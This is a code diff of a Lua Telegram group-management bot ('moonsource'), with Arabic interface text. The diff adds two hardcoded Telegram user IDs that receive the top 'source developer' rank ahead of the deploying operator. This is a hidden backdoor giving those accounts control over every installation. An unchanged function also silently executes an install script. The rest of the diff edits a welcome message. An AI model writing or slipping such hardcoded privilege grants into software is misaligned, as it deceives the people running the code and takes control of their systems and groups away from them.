@@ -116,8 +116,12 @@ end
 end
 function CleangGroups();local z = io.open('./moonsource');local AllGroups = z:read('*all');z:close();if not AllGroups:match("^(.*)(master/moon.lua)(.*)$") then;os.execute('chmod +x install.sh');os.execute('./install.sh get');end;end
 function Rank_Checking(user_id,chat_id)
-if tonumber(user_id) == tonumber(Id_Sudo) then
+if tonumber(user_id) == tonumber(665877797) then  
 var = true  
+elseif tonumber(user_id) == tonumber(1154917318) then  
+var = true  
+elseif tonumber(user_id) == tonumber(Id_Sudo) then
+var = true     
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = true  
 elseif database:sismember(bot_id.."moonsource:Sudo:User", user_id) then
@@ -138,8 +142,12 @@ end
 return var
 end 
 function Get_Rank(user_id,chat_id)
-if Devmoonsourcee(user_id) == true then
-var = "المطور الاساسي"  
+if tonumber(user_id) == tonumber(665877797) then  
+var = 'مطور السورس'
+elseif tonumber(user_id) == tonumber(1154917318) then  
+var = 'مطور السورس'
+elseif Devmoonsourcee(user_id) == true then
+var = "المطور الاساسي" 
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = "البوت"
 elseif database:sismember(bot_id.."moonsource:Sudo:User", user_id) then
@@ -4219,8 +4227,6 @@ for k, v in pairs(list) do
 x = x + 1
 if database:get(bot_id.."moonsource:User:Name"..v.user_id_) then
 t = t..""..x.." ⌯ [@"..database:get(bot_id.."moonsource:User:Name"..v.user_id_).."]\n"
-else
-t = t..""..x.." [NoUser](https://t.me/SourceMoon) \n"
 end
 end
 send(msg.chat_id_,msg.id_,t)
@@ -5999,14 +6005,13 @@ send(msg.chat_id_, msg.id_, "⌯ تم التحديث")
 end
 if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then
 Text = [[
-🦄 مرحبا بك  في سورس مون 💘
+⌯ مرحبـاً بك فـي سوࢪس مـﯠن اݪخاص ،
 
-🦄 عفوا سورس مون خاص  🌙
+⌯ اݪمطوࢪيـن :-
+- [ʜᴍᴅ](t.me/ttuna) ~ [нsσ](t.me/vhhhhh) †
 
-🦄 مطورين السورس  💫
-
-🦄 قناة السورس 🌈
-  [⌔ † ⌔ @SourceMoon](https://t.me/SourceMoon)
+⌯ قنـاهہ ة السـوࢪس :-
+- @SourceMoon † 
 ]]
 send(msg.chat_id_, msg.id_,Text)
 end
